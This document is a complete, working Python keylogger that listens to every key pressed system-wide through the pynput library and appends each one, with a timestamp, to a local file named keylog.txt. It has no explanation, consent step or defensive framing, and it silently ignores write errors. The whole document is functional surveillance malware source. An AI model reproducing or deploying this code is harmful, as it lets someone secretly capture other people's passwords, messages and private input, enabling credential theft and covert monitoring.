import os
from pynput import keyboard
from datetime import datetime

log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")

def write_log(key):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        log = f"[{now}] {key.char}"
    except AttributeError:
        log = f"[{now}] [{key}]"

    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(log + "\n")
    except:
        pass

with keyboard.Listener(on_press=write_log) as listener:
    listener.join()